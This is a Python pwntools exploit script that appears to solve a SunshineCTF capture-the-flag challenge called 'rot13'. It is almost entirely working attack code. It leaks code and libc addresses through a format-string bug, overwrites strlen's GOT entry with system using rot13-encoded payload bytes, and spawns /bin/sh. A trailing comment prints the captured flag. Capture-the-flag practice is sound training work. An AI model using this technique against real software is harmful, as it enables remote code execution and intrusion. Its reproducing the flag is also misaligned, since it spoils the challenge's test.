from pwn import *
import time
import sys

def rot13(DEBUG):
	if DEBUG=="1":
		r = process("./rot13")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'chal1.sunshinectf.org'
		PORT = 20006
		r = remote(HOST,PORT)
	
	def r13(payload):
		return payload.encode("rot13")
	
	offset_strlen_got = 0x1fd4
	
	payload_leak = "|"
	payload_leak += "%"+str(0x153)+"$p"
	payload_leak += "|"
	payload_leak += "%"+str(0x15f)+"$p"
	payload_leak += "|"
	payload_leak = r13(payload_leak)
	
	r.recvuntil("Enter some text to be rot13 encrypted:")
	r.sendline(payload_leak)
	r.recvuntil("Rot13 encrypted data:")
	res = r.recvuntil("Enter some text to be rot13 encrypted:")
	leak = res.split("|")
	print leak
	
	codebase = int(leak[1],16)-0xa59
	__libc_start_main_ret = int(leak[2],16)
	base_libc = __libc_start_main_ret - 0x18637 # libc-2.23.so
	system = base_libc + 0x3ada0
	strlen_got = codebase + offset_strlen_got
	log.info('base_libc: %#x' % base_libc)
	log.info('system: %#x' % system)
	log.info('codebase: %#x' % codebase)
	log.info('strlen_got: %#x' % strlen_got)
	
	# raw_input("?")
	offset = 7
	payload = fmtstr_payload(offset, {strlen_got : system}, write_size="short")
	final_payload = payload
	final_payload = ""
	for i in payload:
		if ord(i) <= 128:
			final_payload += r13(i)
		else:
			final_payload += i
	r.sendline(final_payload)
	r.sendline("/bin/sh")
	
	r.interactive()

rot13(sys.argv[1])
"""
$ cat f*
sun{q0hoy3_e0g13_1f_o3gg3e_gu4a_gu3_3a1tz4_z4pu1a3}
"""